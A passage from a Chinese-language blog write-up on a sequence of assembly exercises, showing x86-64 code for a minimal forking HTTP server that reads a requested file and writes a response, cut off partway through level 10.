class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">5</span>              # read</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">5</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"><span class="symbol">buffer:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"><span class="symbol">file_path:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这一关就是加一个accept调用即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # read(<span class="number">4</span>,buf,count_bytes)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">4</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path</span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path # open(<span class="string">&quot;file_path&quot;</span>, O_RDONLY)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">5</span>              # read(the_file,buf,<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">5</span>      # close(<span class="number">5</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;file_buf&quot;</span>, <span class="built_in">r8</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"><span class="symbol">buffer:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"><span class="symbol">file_path:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>这道题要用fork，经过第七题的拷打之后，简单一些了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">57</span>     # fork()</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">je</span> child_process</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">child_process:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # read(<span class="number">4</span>,buf,count_bytes)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">4</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path</span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path # open(<span class="string">&quot;file_path&quot;</span>, O_RDONLY)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>              # read(the_file,buf,<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8</span>, <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # close(<span class="number">5</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;file_buf&quot;</span>, <span class="built_in">r8</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">done:</span></span><br><span class="line"><span class="meta">    </span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"><span class="symbol">buffer:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">256</span></span><br><span class="line"><span class="symbol">file_path:</span></span><br><span class="line"><span class="meta">    .space</span> <span class="number">64</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>这一关，还挺折磨的。对于客户端发来的信息：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;POST /tmp/tmpgjb407yq HTTP/1.1<span class="char escape_">\r</span><span class="char escape_">\n</span>Host: localhost<span class="char escape_">\r</span><span class="char escape_">\n</span>User-Agent: python-requests/2.32.3<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept: */*<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection: keep-alive<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length: 65<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>K8rWGbWjWUycQmhKDinJRKVnmTd1ssEfnNbxuzygIK4l1pIVgCGgSx0Kdr3xqIFWK&quot;</span></span><br></pre></td></tr></table></figure>

<p>需要解析出length和这个随机字符串。因为后续需要通过write写入文件<code>/tmp/xxx</code>。所以，我想到的方法是将这个字符串存入buffer，然后从buffer的最后一个字节开始逆序遍历，到第一个<code>\n</code>停止。这样可以拿到这个随机字符串的逆序，以及用一个寄存器记录一下长度。后续再通过这个长度来再一次逆序这个随机字符串，从而写入<code>/tmp/xxx</code>。最终代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 